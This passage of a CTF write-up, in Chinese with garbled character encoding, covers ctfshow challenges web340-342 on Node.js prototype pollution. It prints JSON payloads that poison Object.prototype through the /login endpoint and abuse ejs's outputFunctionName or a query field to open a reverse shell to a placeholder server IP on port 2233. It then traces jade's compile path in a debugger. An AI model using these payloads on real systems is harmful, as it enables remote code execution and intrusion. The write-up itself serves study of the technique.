data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619849651649-5929789d-e0ee-40c1-b64a-260dbf694cc8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å‘ç° <code>userinfo</code> çš„åŸå‹ä¸æ˜¯ <code>Object</code> å¯¹è±¡ï¼Œ <code>userinfo.__proto__.__proto__</code> æ‰æ˜¯ <code>Object</code> å¯¹è±¡ã€‚</p><p>å’Œ web339 ä¸€æ ·ï¼Œåªä¸è¿‡è¦å¥—ä¸¤å±‚æ‰èƒ½æ±¡æŸ“ <code>Object</code> å¯¹è±¡ï¼ŒåŒæ ·ç”¨åŸç”Ÿ socketï¼ŒæœåŠ¡ç«¯ç›‘å¬ç«¯å£ä¸º <code>2233</code> ï¼ˆ</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>: &#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;return (function()&#123;var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(2233, &#x27;æœåŠ¡å™¨IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>åŒæ · POST ä¸€ä¸‹ /login æ¥å£æ±¡æŸ“ <code>query</code> å¯¹è±¡</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619849998642-a34ea0a4-6247-469e-8fc4-a54cfc2c3f04.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619849998642-a34ea0a4-6247-469e-8fc4-a54cfc2c3f04.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>POST ä¸€ä¸‹ /api æ¥å£è§¦å‘</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619850047162-862e293e-40a1-426a-8f9b-986bdc9f5cb7.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619850047162-862e293e-40a1-426a-8f9b-986bdc9f5cb7.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>è·å– flag</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619850088128-88f3102a-4583-480c-9554-49acb497f2ac.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619850088128-88f3102a-4583-480c-9554-49acb497f2ac.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web341-åŸå‹é“¾æ±¡æŸ“"><a href="#web341-åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="web341 åŸå‹é“¾æ±¡æŸ“ +++"></a>web341 åŸå‹é“¾æ±¡æŸ“ +++</h2><p>é¢˜ç›®æè¿°å¤„è“å¥äº‘ä¸‹è½½æºç </p><p><a href="https://www.yuque.com/attachments/yuque/0/2021/zip/2789727/1619850192491-23fb3969-02f6-4e21-9ec9-8b8f88691980.zip">ğŸ“web341.zip</a></p><p>è¿™é¢˜å’Œå…¶ä»–ä¸åŒçš„æ˜¯æ²¡æœ‰ <code>/api</code> æ¥å£è§¦å‘æ±¡æŸ“ç‚¹äº†ï¼Œæ‰€ä»¥ä½¿ç”¨ web338 ä¸­çš„ <code>ejs</code> RCEã€‚</p><p>ç„¶ååƒ web340 ä¸€æ ·æ±¡æŸ“è¦å¥—ä¸¤å±‚ã€‚ä¸‹é¢ EXP ä¹ŸæœåŠ¡å™¨ç›‘å¬ç«¯å£æ˜¯ <code>2233</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;(function()&#123;var net=global.process.mainModule.constructor._load(&#x27;net&#x27;),cp=global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh=cp.spawn(&#x27;/bin/sh&#x27;,[]);var client=new net.Socket();client.connect(2233,&#x27;æœåŠ¡å™¨IP&#x27;,function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();var __tmp2&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œçš„å‰é¢çš„ <code>_tmp1;</code> å’Œåé¢çš„ <code>var __tmp2</code> ä¸èƒ½åˆ ï¼Œweb338 <a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">evil0</a> çš„åˆ†ææœ‰ä½“ç°åˆ°ï¼Œæ˜¯ä¸ºäº†é—­åˆä»£ç ã€‚</p><p>åŒæ · POST ä¸€ä¸‹ /login æ¥å£æ±¡æŸ“æ•°æ®</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619851677820-b1f46669-6efd-438f-951a-985b79fe47a4.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619851677820-b1f46669-6efd-438f-951a-985b79fe47a4.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ç„¶åè¯·æ±‚ä¸€ä¸ªä¼šè°ƒç”¨ <code>render</code> æ–¹æ³•çš„æ¥å£</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619851738320-0ec2f215-6519-436e-bb0c-23c3bd68dd09.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619851738320-0ec2f215-6519-436e-bb0c-23c3bd68dd09.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å³å¯è·å¾— flag</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619851757626-20f8d982-09e9-44d2-9d6c-b1a67c5aed51.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619851757626-20f8d982-09e9-44d2-9d6c-b1a67c5aed51.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web342-åŸå‹é“¾æ±¡æŸ“"><a href="#web342-åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="web342 åŸå‹é“¾æ±¡æŸ“ ++++"></a>web342 åŸå‹é“¾æ±¡æŸ“ ++++</h2><p>é¢˜ç›®æè¿°å¤„è“å¥äº‘ä¸‹è½½æºç </p><p><a href="https://www.yuque.com/attachments/yuque/0/2021/zip/2789727/1619851833054-73b176d1-8460-439c-b5a4-bfe106363cda.zip">ğŸ“web342.zip</a></p><p>ç„¶åè¿˜æœ‰ä¸ªæç¤º</p><blockquote><p>å®¡è®¡äº†1ä¸ªå°æ—¶å‘ç°çš„ï¼Œæ­¤é“¾ç›®å‰ç½‘ä¸Šæœªå…¬å¼€ï¼Œéš¾åº¦ç¨å¤§</p></blockquote><p>æœ¬é¢˜å°±ä¸æ˜¯ç”¨ <code>ejs</code> è¿›è¡Œæ¨¡æ¿æ¸²æŸ“äº†ï¼Œè€Œæ˜¯ä½¿ç”¨äº† <code>jade</code></p><p>ä¸€å¼€å§‹æƒ³çœ‹å…¶ä»–å¸ˆå‚…çš„æ–‡ç« </p><p><a href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></p><p>emmï¼Œä½†æ˜¯å‘ç°è¯´çš„æ¯ä¸ªå­—éƒ½è®¤è¯†ï¼Œè¿èµ·æ¥å°±è§‰å¾—æœ‰ç‚¹è«åå…¶å¦™äº†ã€‚ã€‚äºæ˜¯æƒ³ç€å…ˆè‡ªå·±æ‰‹åŠ¨åˆ†æä¸€ä¸‹ï¼Œç†Ÿæ‚‰ä¸€æ³¢ï¼Œæ–¹ä¾¿è‡ªå·±å’Œå¸ˆå‚…åœ¨åŒä¸€ä¸ªé¢‘é“ä¸Šï¼Œé˜²æ­¢å¸ˆå‚…è¯´çš„æ¯å¥è¯éƒ½æ„Ÿè§‰è«åå…¶å¦™â€¦</p><p>è¯¦ç»†çš„æ–­ç‚¹åˆ†æå‚è€ƒ</p><p><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade">https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade</a></p><p>è¿™é‡Œç”¨ VS Code æ¥ debug åˆ†æ</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619854278042-c637cf51-7238-480e-84dd-f49d977bf14c.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619854278042-c637cf51-7238-480e-84dd-f49d977bf14c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å°±ä¼šè‡ªåŠ¨åˆ›å»ºè¿™æ ·ä¸€ä¸ªæ–‡ä»¶</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Use IntelliSense to learn about possible attributes.</span></span><br><span class="line">    <span class="comment">// Hover to view descriptions of existing attributes.</span></span><br><span class="line">    <span class="comment">// For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;0.2.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;pwa-node&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;request&quot;</span>: <span class="string">&quot;launch&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Launch Program&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;skipFiles&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;&lt;node_internals&gt;/**&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;program&quot;</span>: <span class="string">&quot;$&#123;workspaceFolder&#125;/bin/www&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åä¸‹ä¸ªæ–­ç‚¹ï¼Œè¿è¡Œä¸€ä¸‹ï¼Œè®¿é—®ç½‘é¡µå°±å¯ä»¥å¼€å§‹æ„‰å¿«çš„ debug äº†</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619854350300-e85ce972-6f11-4105-86ea-ceec77a7a079.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619854350300-e85ce972-6f11-4105-86ea-ceec77a7a079.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>è¿™é‡Œç›´æ¥ç”¨ ctfshow web342 çš„ä»£ç è¿›è¡Œ</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619854418013-7df0201d-5afd-4fa6-867d-91c75397438f.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619854418013-7df0201d-5afd-4fa6-867d-91c75397438f.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ä¾æ¬¡è¿›å…¥ <code>res.render=&gt;app.render=&gt;tryRender=&gt;view.render=&gt;this.engine</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619856672860-52054ba9-715c-4171-9cf2-f485f64e9450.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619856672860-52054ba9-715c-4171-9cf2-f485f64e9450.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å…¥å£æ˜¯ <code>rederFile</code> æ–¹æ³•ï¼Œæ³¨æ„ <code>renderFile</code> å‡½æ•°è¿”å›å€¼å¯æ‰§è¡Œ</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619856772234-91b25d6c-3375-4d2d-8f9e-2abba085d1f4.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619856772234-91b25d6c-3375-4d2d-8f9e-2abba085d1f4.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>è¿›å…¥ <code>handleTemplateCache</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619856901774-19728d60-fe53-4909-8585-1e8a528a6e2e.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619856901774-19728d60-fe53-4909-8585-1e8a528a6e2e.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>è¿›å…¥ <code>compile</code> å‡½æ•°</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619858466276-d82584d9-6d7a-4596-9e3d-6562eb0ab828.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619858466276-d82584d9-6d7a-4596-9e3d-6562eb0ab828.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>205è¡Œ æœ‰ä¸ª <code>parse</code> è§£æï¼Œå¯ä»¥çœ‹åˆ°ç»“æœè¿”å›åˆ° <code>parsed</code>ï¼Œåˆä¼ é€’ç»™äº† <code>fn</code>ï¼Œå…ˆä¸ç®¡ <code>parse</code> æ–¹æ³•ï¼Œç»§ç»­å‘ä¸‹çœ‹ä»£ç </p><p>218è¡Œ è¿™é‡Œå°±æ¯”è¾ƒæœ‰è¶£äº†ï¼Œæœ‰ä¸ªçœ‹ä¼¼å¯æ§çš„ä»£ç æ‰§è¡Œï¼ˆnew Functionï¼Œè¿™ä¸ªåœ¨ web339 æœ‰æåˆ°ï¼‰</p><p>è¿›å…¥ <code>parse</code> çœ‹çœ‹è¿”å›å€¼ä¸­æ˜¯å¦æœ‰å¯æ§éƒ¨åˆ†</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619867701016-f7cb858e-1918-4175-9dbf-ea13194759fb.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619867701016-f7cb858e-1918-4175-9dbf-ea13194759fb.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><code>parse</code> æ–¹æ³•å†…éƒ¨å¯ä»¥çœ‹åˆ°å…ˆå†…éƒ¨ <code>parse</code> å†å†…éƒ¨ <code>compile</code>ï¼Œå†…éƒ¨ <code>parse</code> ç»“æœæœ€ç»ˆä¼šè¢«æ‹¼æ¥åˆ°å¤–å±‚ <code>parse</code> å‡½æ•°è¿”å›å€¼éƒ¨åˆ†</p><p>å³ 114è¡Œçš„ <code>jså¯¹è±¡</code> è¢«æ‹¼æ¥åˆ° 148è¡Œ æˆ– 149è¡Œçš„ <code>jså¯¹è±¡</code> é‡Œï¼Œæœ€ç»ˆæ‹¼æ¥åˆ° <code>bodyé”®</code> è¿”å›</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619867784532-85765a8b-e580-44a3-83f6-f2cba0b44a17.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619867784532-85765a8b-e580-44a3-83f6-f2cba0b44a17.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å…ˆè·Ÿè¿› <code>114è¡Œ</code> çš„ <code>compile</code> æ–¹æ³•ï¼Œå‘ç°æœ¬æ–¹æ³•è¿”å›çš„æ˜¯ <code>buf</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619867921514-76f56262-dd87-4e1c-9aac-719ca84ce527.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619867921514-76f56262-dd87-4e1c-9aac-719ca84ce527.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>è·Ÿè¿› 66è¡Œçš„ <code>this.visit(this.node);</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619868103558-5ad3d284-46a1-4346-afeb-9f84dafbb60b.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619868103558-5ad3d284-46a1-4346-afeb-9f84dafbb60b.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å‘ç°å¯æ§ï¼ˆå› ä¸º <code>node.filename</code> è¢« <code>utils.stringify()</code> äº†ï¼‰çš„ <code>node.line</code> å¯ä»¥è¢« <code>push</code> åˆ° <code>buf</code> ä¸­ï¼Œæ¡ä»¶æ˜¯ <code>this.debug=true</code></p><p>ç„¶ååœ¨ 212è¡Œçš„ <code>this.visitNode(node);</code> å»éå† ast æ ‘ï¼Œéå†å®Œåå›åˆ° <code>compile</code> æ–¹æ³•</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619874182215-9b53b14d-ced5-4573-9e05-d5a0d55bf0cd.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619874182215-9b53b14d-ced5-4573-9e05-d5a0d55bf0cd.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ° <code>node.line</code> è¢«è®°å½•åˆ° fn ä¸­ï¼Œç„¶åé€šè¿‡ <code>Function</code> è°ƒç”¨æ‰§è¡Œè¿™éƒ¨åˆ†ä»£ç ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬å¯ä»¥æ±¡æŸ“ <code>node.line</code> å°±å¯ä»¥è¿è¡Œæˆ‘ä»¬ä»£ç ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ <code>jade</code> æœ¬èº«æ˜¯æ²¡æœ‰æ¼æ´çš„ï¼Œå› ä¸ºæ¨¡æ¿çš„æ¸²æŸ“é€»è¾‘æ˜¯å¦‚ä½•ï¼Œä½†é—®é¢˜æ˜¯ï¼Œå¦‚æœå­˜åœ¨å¯æ§çš„åŸå‹é“¾æ±¡æŸ“ï¼Œå°±å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ±¡æŸ“ <code>node.line</code> ã€‚</p><p>äºæ˜¯å°è¯• POST <code>/login</code> æ¥å£</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ–­ç‚¹å‘ç°ï¼Œï¼Œ <code>node.line</code> å€¼è¿˜æ˜¯ <code>0</code>ã€<code>1</code>ã€<code>2</code> ä¹‹ç±»çš„ï¼Ÿ</p><p>çªç„¶é†’æ‚Ÿï¼Œï¼Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­å‘ç°ï¼Œ<code>node.line</code> æ˜¯å­˜åœ¨å€¼çš„ï¼Œæ¯”å¦‚ä¸Šå›¾ä¸­çš„ <code>0</code>ã€<code>1</code>ã€<code>2</code> ï¼Œå¦‚æœå­˜åœ¨å€¼çš„è¯ï¼Œå®ƒä¼šç›´æ¥è·å–è¿™ä¸ªå€¼ï¼Œè€Œä¸æ˜¯è·å–æˆ‘ä»¬æ±¡æŸ“è¿‡çš„ <code>Object</code> å¯¹è±¡é‡Œçš„å€¼ï¼</p><p>å…¶å®åŸå‹é“¾æ±¡æŸ“çš„åˆ©ç”¨æ ¸å¿ƒå°±æ˜¯ï¼šè®¿é—®å¯¹è±¡çš„å±æ€§/å€¼ä¸º undefined æ‰è¡Œï¼Œä¸ç„¶æˆ‘ä»¬æ±¡æŸ“ <code>Object</code> å¯¹è±¡å°±æ²¡æœ‰æ„ä¹‰äº†ã€‚</p><p>ç°åœ¨çœ‹è¿™ç¯‡æ–‡ç« å°±èƒ½çœ‹æ‡‚äº†ï¼Œè€Œä¸”å‘ç°æ€»ç»“çš„éå¸¸å¥½ã€‚ã€‚</p><p><a href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></p><p>å¥½çš„ï¼Œåœ¨åŒä¸€é¢‘é“ä¸Šäº†ã€‚</p><p>å…ˆæ¢³ç†ä¸Šé¢åˆ†æçš„å‡½æ•°è°ƒç”¨æ ˆï¼Œæˆ‘ä»¬æ–­ç‚¹å…¥å£åœ¨ <code>routes/index.js</code> <code>res.render(&#39;index&#39;,&#123;title:&#39;ctfshow&#39;&#125;);</code> ï¼Œè°ƒç”¨æ ˆå¦‚ä¸‹</p><ol><li><p>routes/index.js :: res.render</p></li><li><p>jade/lib/index.js :: exports.__express</p></li><li><p>jade/lib/index.js :: exports.renderFile</p></li><li><ol><li>jade/lib/index.js :: handleTemplateCache</li></ol></li><li><p>jade/lib/index.js :: exports.compile</p></li><li><ol><li>jade/lib/index.js :: parse -&gt; compiler.compile();</li></ol></li><li><ol><li><ol><li>jade/lib/compiler.js :: Compiler.compile 